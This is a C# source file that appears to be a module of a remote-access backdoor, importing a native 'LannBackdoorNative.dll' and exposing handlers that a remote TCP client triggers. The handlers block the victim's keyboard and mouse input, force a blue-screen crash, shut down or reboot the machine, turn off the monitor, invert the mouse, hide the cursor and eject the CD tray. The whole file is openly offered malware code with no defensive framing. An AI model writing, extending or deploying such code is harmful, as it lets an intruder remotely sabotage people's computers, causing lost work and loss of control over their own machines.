using System.Runtime.InteropServices;
using FSModule.Structures;
using FunModule.Structures.Handlers;
using LannLogger;
using ModulesApi;
using Networking;
using Networking.Packets;
using Networking.Structures;
using Serilog.Core;
using SystemModule.Structures;

namespace FunModule;

[Module("fun")]
public class FunModuleImpl : IModule {
    private static readonly Logger Logger = LoggerFactory.CreateLogger("Module", "FileSystem");

    [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
    private static extern bool BlockInput([In] [MarshalAs(UnmanagedType.Bool)] bool fBlockIt);

    [DllImport("user32.dll")]
    private static extern int ShowCursor(bool bShow);
    
    [DllImport("LannBackdoorNative.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
    private static extern void RaiseBSOD();

    [DllImport("LannBackdoorNative.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
    private static extern void ShutdownPC(bool restart);
    
    [DllImport("LannBackdoorNative.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
    private static extern void ToggleMouseInvese(bool turnOn);

    [DllImport("LannBackdoorNative.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
    private static extern void ToggleMonitor(bool turnOn);

    [DllImport("LannBackdoorNative.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
    private static extern void OpenCDRom();

    [Handler("blockInput")]
    public async Task BlockInputHandler(TCPClient client, BlockInputHandlerData data) {
        BlockInputResult result = new();
        BlockInput(data.Enable);

        await Callback(client, "blockInput", result);
    }

    [Handler("bsod")]
    public async Task BsodHandler(TCPClient client, EmptyHandlerData data) {
        RaiseBSOD();
    }

    [Handler("cdrom")]
    public async Task CDRomHandler(TCPClient client, EmptyHandlerData data) {
        CDRomResult result = new();
        try {
            OpenCDRom();
            result.Success = true;
        } catch (Exception error) {
            result.Error = error.Message;
            result.Success = false;
        }

        await Callback(client, "cdrom", result);
    }

    [Handler("shutdown")]
    public async Task ShutdownHandler(TCPClient client, EmptyHandlerData data) {
        ShutdownPC(false);
    }

    [Handler("reboot")]
    public async Task RebootHandler(TCPClient client, EmptyHandlerData data) {
        ShutdownPC(true);
    }

    [Handler("toggleMonitor")]
    public async Task ToggleMonitorHandler(TCPClient client, ToggleMonitorHandlerData data) {
        ToggleMonitorResult result = new();
        try {
            ToggleMonitor(data.Enable);
            result.Success = true;
        } catch (Exception error) {
            result.Error = error.Message;
            result.Success = false;
        }

        await Callback(client, "toggleMonitor", result);
    }
    
    [Handler("toggleMouseInverse")]
    public async Task ToggleMonitorHandler(TCPClient client, ToggleMouseHandlerData data) {
        ToggleMouseResult result = new();
        try {
            ToggleMouseInvese(data.Enable);
            result.Success = true;
        } catch (Exception error) {
            result.Error = error.Message;
            result.Success = false;
        }

        await Callback(client, "toggleMouseInverse", result);
    }
    
    [Handler("toggleCursorHide")]
    public async Task ToggleCursorHideHandler(TCPClient client, ToggleCursorHideHandlerData data) {
        ToggleCursorHideResult result = new();
        try {
            ShowCursor(data.Enable);
            result.Success = true;
        } catch (Exception error) {
            result.Error = error.Message;
            result.Success = false;
        }

        await Callback(client, "toggleCursorHide", result);
    }
}